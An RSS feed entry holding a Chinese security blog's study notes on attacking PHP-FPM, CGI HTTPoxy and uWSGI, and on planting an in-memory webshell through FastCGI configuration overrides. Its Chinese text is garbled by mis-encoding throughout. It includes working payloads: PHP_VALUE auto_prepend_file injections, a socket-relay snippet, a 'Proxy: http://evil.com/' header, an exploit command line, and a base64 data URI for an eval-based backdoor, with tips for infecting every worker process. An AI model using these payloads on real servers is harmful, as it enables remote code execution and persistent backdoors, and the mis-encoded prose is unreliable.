<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>php-fpm on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/php-fpm/</link><description>Recent content in php-fpm on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 13 Sep 2022 14:46:49 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/php-fpm/index.xml" rel="self" type="application/rss+xml"/><item><title>PHP-FPMå†…å­˜é©¬&amp;æ”»å‡»CGIå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2022/09/13/php-fpm-mem-shell-study-notes/</link><pubDate>Tue, 13 Sep 2022 14:46:49 +0800</pubDate><guid>https://amiaaaz.github.io/2022/09/13/php-fpm-mem-shell-study-notes/</guid><description>&lt;p>çœ‹åˆ°å¸¦ä½¬ç”¨php-fpmåšå†…å­˜é©¬ï¼Œäºæ˜¯æŠŠphp-fpmå’Œcgiç›¸å…³çš„çŸ¥è¯†å†æ‹¿å‡ºæ¥å­¦å­¦å­¦&lt;/p>
&lt;h2 id="æ”»å‡»php-fpm">æ”»å‡»php-fpm&lt;/h2>
&lt;p>FastCGIæ˜¯å¸¸è§çš„webserveråŠ¨æ€è„šæœ¬æ‰§è¡Œæ¨¡å‹ä¹‹ä¸€ï¼Œä¸»è¦ç›®çš„æ˜¯å°†webserverå’ŒåŠ¨æ€è¯­è¨€çš„æ‰§è¡Œåˆ†æˆä¸¤ä¸ªä¸åŒçš„å¸¸é©»è¿›ç¨‹ï¼Œå½“webserveræ¥æ”¶åˆ°åŠ¨æ€è„šæœ¬çš„è¯·æ±‚ï¼Œå°±é€šè¿‡fastcgiåè®®å°†è¯·æ±‚é€šè¿‡ç½‘ç»œè½¬å‘ç»™fastcgiè¿›ç¨‹ï¼ˆå³fpmï¼‰ï¼Œå¤„ç†ä¹‹åå†å°†ç»“æœä¼ ç»™webserverï¼Œç„¶åwebserverå†è¾“å‡ºç»™æµè§ˆå™¨ï¼›è¿™ç§æ¨¡å‹ä¸‹ä¸éœ€è¦åµŒå…¥è„šæœ¬è§£é‡Šå™¨åˆ°webserverä¸­ï¼Œå¢åŠ ä¼¸ç¼©æ€§å’Œå¯ç»´æŠ¤æ€§&lt;/p>
&lt;p>fpmçš„é»˜è®¤ç›‘å¬ç«¯å£æ˜¯9000ï¼Œå¦‚æœç›®æ ‡å¯¹å¤–å¼€æ”¾äº†9000ç«¯å£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¼€æ”¾çš„fpmå¯¹å…¶å‘é€ç¬¦åˆfastcgiåè®®çš„è¯·æ±‚ï¼Œå½“headerä¸­çš„typeæŒ‡å®šä¸º4æ—¶ å¯ä»¥ç»™php-fpnä¼ é€’ç¯å¢ƒå‚æ•°ï¼ŒåŒ…å«ä»¥ä¸‹çš„å†…å®¹&lt;/p>
&lt;pre tabindex="0">&lt;code>{
&amp;#39;GATEWAY_INTERFACE&amp;#39;: &amp;#39;FastCGI/1.0&amp;#39;,
&amp;#39;REQUEST_METHOD&amp;#39;: &amp;#39;GET&amp;#39;,
&amp;#39;SCRIPT_FILENAME&amp;#39;: &amp;#39;/var/www/html/index.php&amp;#39;,
&amp;#39;SCRIPT_NAME&amp;#39;: &amp;#39;/index.php&amp;#39;,
&amp;#39;QUERY_STRING&amp;#39;: &amp;#39;?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;REQUEST_URI&amp;#39;: &amp;#39;/index.php?a=1&amp;amp;b=2&amp;#39;,
&amp;#39;DOCUMENT_ROOT&amp;#39;: &amp;#39;/var/www/html&amp;#39;,
&amp;#39;SERVER_SOFTWARE&amp;#39;: &amp;#39;php/fcgiclient&amp;#39;,
&amp;#39;REMOTE_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;REMOTE_PORT&amp;#39;: &amp;#39;12345&amp;#39;,
&amp;#39;SERVER_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
&amp;#39;SERVER_PORT&amp;#39;: &amp;#39;80&amp;#39;,
&amp;#39;SERVER_NAME&amp;#39;: &amp;#34;localhost&amp;#34;,
&amp;#39;SERVER_PROTOCOL&amp;#39;: &amp;#39;HTTP/1.1&amp;#39;
}
&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­&lt;code>SCRIPT_FILENAME&lt;/code>å°±æ˜¯php-fpmä¼šå»æ‰§è¡Œçš„æ–‡ä»¶ï¼Œç”±äº5.3.9ç‰ˆæœ¬å¼•å…¥äº†&lt;code>security.limit_extensions&lt;/code>çš„é€‰é¡¹ï¼Œé»˜è®¤å¯¹åç¼€åé™åˆ¶åœ¨äº†phpå®¶æ—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ‰¾åˆ°å·²å­˜åœ¨phpæ–‡ä»¶ï¼ˆå®‰è£…æ—¶é™„å¸¦çš„phpæ–‡ä»¶ å¯ä»¥é€šè¿‡&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>æ¥æœç´¢ä¸€ä¸‹é»˜è®¤ç¯å¢ƒ æ¯”å¦‚/usr/local/lib/php/PEAR.phpï¼‰ï¼Œå‘å…¶ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼›è€Œfpmæ”¯æŒé€šè¿‡è®¾ç½®&lt;code>FASTCGI_PARAMS&lt;/code>æ¥åŠ¨æ€ä¿®æ”¹ php çš„è®¾ç½®ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸¤é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_VALUE&amp;#39;: &amp;#39;auto_prepend_file = php://input&amp;#39;,
&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On&amp;#39;
# &amp;#34;allow_url_include = On\ndisable_functions = \nsafe_mode = Off&amp;#34;
# &amp;#34;allow_url_include = On\nextension = /path/to/abc.so&amp;#34;
&lt;/code>&lt;/pre>&lt;p>æ¥åšåˆ°æ‰§è¡ŒæŸphpæ–‡ä»¶æ—¶è‡ªåŠ¨åŒ…å« POST å†…å®¹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆdisable_functionåœ¨phpåŠ è½½æ—¶å°±ç¡®å®šå¥½äº†ï¼Œæ— æ³•é‡å†™ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹open_basedirçš„å€¼ï¼‰&lt;/p>
&lt;p>æ‰€ä»¥ç»¼ä¸Šï¼Œæˆ‘ä»¬çš„æ”»å‡»æ€è·¯å°±æ˜¯ä¼ªé€ ä¸€ä¸ªå¯ä»¥æ­£å¸¸é€šä¿¡çš„FastCGIå®¢æˆ·ç«¯ï¼Œå°†ä¼ è¾“çš„å†…å®¹ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„payloadï¼ˆåˆ©ç”¨&lt;code>PHP_VALUE&lt;/code>å’Œ&lt;code>PHP_ADMIN_VALUE&lt;/code>è¿™ä¸¤ä¸ªå¯åŠ¨æ€ä¿®æ”¹phpè®¾ç½®çš„é¡¹ï¼‰ï¼Œå†å‘å‡ºå»ï¼›æ ¹æ®ç›®æ ‡åˆå¯ä»¥åˆ†æˆä»¥ä¸‹å‡ ç§&lt;/p>
&lt;ul>
&lt;li>&lt;strong>è¿œç¨‹æ”»å‡»php-fpm&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>pç‰›çš„php-fpmè„šæœ¬ç›´æ¥å—¦ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„phpä»£ç æˆ–åŠ è½½æ¶æ„.so&lt;/p>
&lt;ul>
&lt;li>&lt;strong>SSRFæ”»å‡»æœ¬åœ°php-fpm&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>ç”¨gopheræ‰“å†…ç½‘fpm9000ï¼Œpayloadè¿˜æ˜¯pç‰›çš„è„šæœ¬&lt;/p>
&lt;ul>
&lt;li>&lt;strong>ç»“åˆftp&amp;amp;PASV modeæ”»å‡»æœ¬åœ°php-fpmï¼ˆå·²çŸ¥å¼€æ”¾å†…ç½‘fpmç«¯å£ï¼‰&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>åœ¨å—å®³è€…ç«¯æ¨¡æ‹Ÿä¸€ä¸ªftp-serverï¼ˆç”¨æ¥å°†æˆ‘ä»¬å¸Œæœ›æ‰§è¡Œçš„å†…å®¹è½¬å‘è‡³fpmï¼‰ï¼Œåœ¨å“åº”PASVå‘½ä»¤ï¼ˆå³åˆ‡æ¢è¢«åŠ¨æ¨¡å¼æ—¶ï¼‰è¿”å›&lt;code>(127,0,0,1,0,12345)&lt;/code>æ¥è®©ftp-dataæ‰“å‘æˆ‘ä»¬æŒ‡å®šçš„å†…ç½‘12345ç«¯å£ï¼›å¦‚æœæ˜¯EPSV modeï¼Œå°±ä¸ä¼šåœ¨é€šä¿¡ä¸­æœ‰(ip, port)çš„å€¼ åªèƒ½æŠŠdataæ‰“å‘æ§åˆ¶è¿æ¥çš„æœåŠ¡ç«¯çš„ç«¯å£ï¼Œè§£å†³æ–¹æ³•ï¼šæ‰‹åŠ¨æŠŠEPSVå‘½ä»¤çš„è¿”å›ç»“æœè®¾ä¸ºé229çš„å€¼ï¼Œé‚£ä¹ˆphpçš„ftp://å°±ä¼šä½¿ç”¨PASVå‘½ä»¤&lt;/p>
&lt;p>ä¹‹åç”¨ç»§ç»­ä¸Šé¢php-fpmçš„è„šæœ¬ï¼Œå…ˆè¦†ç›–æ‰åŸæœ‰open_basedirçš„è®¾ç½®å†å†™å…¥æ¶æ„.soï¼Œè¿›è¡ŒRCE&lt;/p>
&lt;ul>
&lt;li>&lt;strong>æ”»å‡»unix-socketæ¨¡å¼ä¸‹çš„php-fpm&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>ç”±äºunix-socketæ˜¯è¯»å–/run/php/php7.4-fpm.sockè¿›è¡Œå†…éƒ¨é€šä¿¡ï¼Œæ‰€ä»¥ä¸èƒ½æ‰“è¿œç¨‹çš„ï¼Œæˆ‘ä»¬ç”¨&lt;code>stream_socket_client&lt;/code>å»ºç«‹ä¸€ä¸ªunix-socketè¿æ¥ï¼Œç„¶åå†™å…¥tcpæµæ¥é€šä¿¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cgi-httpoxy">CGI HTTPoxy&lt;/h2>
&lt;blockquote>
&lt;p>php&amp;lt;5.6.24&lt;/p>
&lt;p>ä¸æ­¢å½±å“phpï¼Œæ‰€æœ‰ä»¥CGIæˆ–Fastcgiè¿è¡Œçš„ç¨‹åºç†è®ºä¸Šéƒ½å—åˆ°å½±å“&lt;/p>
&lt;p>&lt;a href="https://httpoxy.org/">httpoxy&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>æ ¹æ®RFC 3875çš„è§„å®šï¼ŒCGI/FastCGIè¦å°†ç”¨æˆ·ä¼ å…¥çš„æ‰€æœ‰httpå¤´éƒ½åŠ ä¸Š&lt;code>HTTP_&lt;/code>å‰ç¼€æ”¾å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œè€Œæ°å¥½å¤§å¤šæ•°ç±»åº“ä¼šçº¦å®šä¿—æˆåœ°æå–ç¯å¢ƒå˜é‡&lt;code>HTTP_PROXY&lt;/code>ä½œä¸ºç¨‹åºHTTPä»£ç†åœ°å€ï¼Œäºæ˜¯å¯ä»¥æ„é€ &lt;code>Proxy: http://evil.com/&lt;/code>è¿™æ ·çš„è¯·æ±‚å¤´å°†ä½¿ç”¨ç¼ºé™·ç±»åº“çš„ç½‘ç«™çš„ä»£ç†è®¾ç½®ä¸º&lt;code>http://evil.com/&lt;/code>&lt;/p>
&lt;h2 id="uwsgi-rce">uWSGI RCE&lt;/h2>
&lt;p>ç±»ä¼¼fastcgiï¼Œç»å¸¸ä½œä¸ºpythonåº”ç”¨å®¹å™¨å¯åŠ¨ï¼Œä¹Ÿæ”¯æŒåŠ è½½perl/ruby/goç­‰åº”ç”¨&lt;/p>
&lt;p>æ¼æ´çš„æˆå› å’Œä¸Šé¢é‚£ä¸ªå¾ˆç›¸ä¼¼ï¼Œåœ¨uwsgiçš„åè®®ä¸­å…è®¸é€šè¿‡å˜é‡æ¥åŠ¨æ€è°ƒæ•´å‚æ•°ï¼Œå…¶ä¸­&lt;code>UWSG_FILE&lt;/code>å‚æ•°å¯ä»¥ç”¨æ¥å¿½ç•¥åŸæœ‰uWSGIç»‘å®šçš„appï¼Œè®¾å®šä¸€ä¸ªæ–°çš„æ–‡ä»¶è¿›è¡ŒåŠ è½½æ‰§è¡Œï¼ˆç±»ä¼¼ä¸Šé¢çš„&lt;code>SCRIPT_FILENAME&lt;/code>ï¼‰&lt;/p>
&lt;p>åŒæ—¶uWSGIç¨‹åºä¸­é»˜è®¤æ³¨å†Œäº†ä¸€ç³»åˆ—schemesï¼Œå¯¼è‡´å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">uwsgi_setup_schemes&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;emperor&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_emperor&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_http&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sym&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_sym&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;section&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_section&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_fd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_exec&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;call&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_call&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;callint&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_callint&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">uwsgi_scheme_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">add_zero&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pipe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;pipe()&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_run_command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uwsgi_read_fd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">add_zero&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­å­˜åœ¨execåè®®ï¼Œç»“åˆå‰é¢çš„&lt;code>UWSGI_FILE&lt;/code>å˜é‡ï¼Œå¯ä»¥å¯¼è‡´RCE&lt;/p>
&lt;p>å±äºæ˜¯å’Œä¸Šé¢php-fpmæ— é™ç±»ä¼¼ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è®¿é—®åˆ°çš„uWSGIç«¯å£ï¼ˆuWSGIåè®®ï¼‰å¹¶å¯¹å…¶å‘é€uWSGIåè®®çš„payloadå³å¯&lt;/p>
&lt;p>ä¾‹å¦‚ç›®æ ‡ä¸»æœºä¸Šæ˜¯è¿™æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>uwsgi --socket :8001 --module project.wsgi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥åˆ©ç”¨&lt;a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">uwsgi_exp.py&lt;/a>å—¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python uwsgi_exp.py -u x.x.x.x:8001 -c &lt;span style="color:#d88200">&amp;#34;echo &amp;#39;1111&amp;#39; &amp;gt; /tmp/test&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="php-fpmåšå†…å­˜é©¬">php-fpmåšå†…å­˜é©¬&lt;/h2>
&lt;p>å†…å­˜é©¬ä¸å¸¸è§„çš„webshellæœ€æ˜¾è‘—çš„åŒºåˆ«åœ¨äºåˆ é™¤ä¸Šé©¬å‡­å€Ÿçš„æ–‡ä»¶åä¾æ—§å­˜åœ¨äºå½“å‰è¿›ç¨‹ä¸­ï¼Œé™¤éé‡å¯ç¨‹åºï¼›æŠ½è±¡å‡ºæˆ‘ä»¬çš„éœ€æ±‚ï¼š&lt;/p>
&lt;ol>
&lt;li>è®©åé—¨ä»£ç åœ¨å†…å­˜ä¸­é©»ç•™&lt;/li>
&lt;li>å¯ä»¥é€šè¿‡æ­£å¸¸çš„è¯·æ±‚æ‰‹æ®µè§¦å‘æ‰§è¡Œ&lt;/li>
&lt;/ol>
&lt;p>å¯¹äºç¬¬ä¸€ç‚¹ï¼Œæœ¬èº«æˆ‘ä»¬çš„fastcgi(fpm)å°±æ˜¯å¸¸é©»å†…å­˜çš„ï¼ˆä¹Ÿæ˜¯ä¼˜äºä¼ ç»Ÿcgiçš„åœ°æ–¹ï¼‰ï¼Œå¹¶ä¸”åœ¨ä¸€æ¬¡fastcgiè¯·æ±‚ä¸­ç»è¿‡&lt;code>PHP_VALUE&lt;/code>æˆ–&lt;code>PHP_ADMIN_VALUE&lt;/code>ä¿®æ”¹çš„phpé…ç½®å€¼åœ¨æ­¤fpmçš„ç”Ÿå‘½å‘¨æœŸå†…éƒ½ä¼šè¢«ä¿ç•™ä¸‹æ¥&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»§ç»­æ²¿ç”¨ä¸Šé¢æ”»å‡»php-fpmçš„æ–¹æ³•&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_VALUE&amp;#39;: &amp;#39;auto_prepend_file = php://input&amp;#39;
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯è¿™æ ·çš„&lt;code>php://input&lt;/code>éœ€è¦è§£ææ¯ä¸€æ¬¡çš„ä»£ç ï¼Œå¯¹äºå†…å­˜é©¬æ¥è¯´ç›¸å½“å¤±è´¥ï¼Œæˆ‘ä»¬æŠŠå®ƒæ¢æˆdataåè®®å›ºå®šä¸‹æ¥&lt;/p>
&lt;p>å‡è®¾è¿™é‡Œæ˜¯&lt;strong>SSRFæ”»å‡»æœ¬åœ°php-fpm&lt;/strong>çš„åœºæ™¯ï¼Œæˆ‘ä»¬ç»§ç»­ç”¨ä¸Šé¢çš„è„šæœ¬ï¼Œç¨ä½œä¿®æ”¹&lt;/p>
&lt;ul>
&lt;li>
&lt;p>postæ¢ä¸ºgetï¼ˆä¸éœ€è¦è§£æphp://input&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>auto_prepend_file = \&amp;quot;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\&amp;quot;&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>å…¶ä½™çš„ä¸å˜ï¼Œä¾æ—§è¦æŒ‡å®šä¸€ä¸ªæœåŠ¡ç«¯å·²å­˜åœ¨çš„æ–‡ä»¶ï¼Œä¹‹åé€šè¿‡è¿™ä¸ª&lt;code>auto_prepend_file&lt;/code>å°±å¯ä»¥æ¤å…¥å†…å­˜é©¬&lt;/p>
&lt;p>ä¸è¿‡è¿™æ ·çš„æ–¹æ¡ˆä¹Ÿæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œå®ƒæ˜¯å’ŒæœåŠ¡ç«¯çš„php-fpm workerè¿›ç¨‹ç»‘å®šçš„ï¼Œå¦‚æœæœåŠ¡å™¨ä¸Šæœ‰å¤šä¸ªworkerè¿›ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦å¤šå‘é€å‡ æ¬¡ä¹‹å‰çš„è¯·æ±‚ï¼Œæ‰å¯ä»¥è®©payloadæ„ŸæŸ“æ¯ä¸€ä¸ªè¿›ç¨‹&lt;/p>
&lt;p>å¦ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯php-fpm.confçš„ä¸€ä¸ªé…ç½®é¡¹&lt;code>pm.max_requests&lt;/code>ï¼Œå®ƒå®šä¹‰äº†æ¯ä¸€ä¸ª worker è¿›ç¨‹æœ€å¤§å¤„ç†å¤šå°‘è¯·æ±‚ï¼Œå°±ä¼šè‡ªåŠ¨é‡å¯ï¼Œé¿å…å†…å­˜æ³„æ¼ï¼Œä½†æ˜¯ä¸€æ—¦é‡ç”Ÿæˆ‘ä»¬çš„å†…å­˜é©¬ä¹Ÿä¼šå¤±æ•ˆï¼Œè¿˜å¥½é»˜è®¤æ˜¯0&lt;/p>
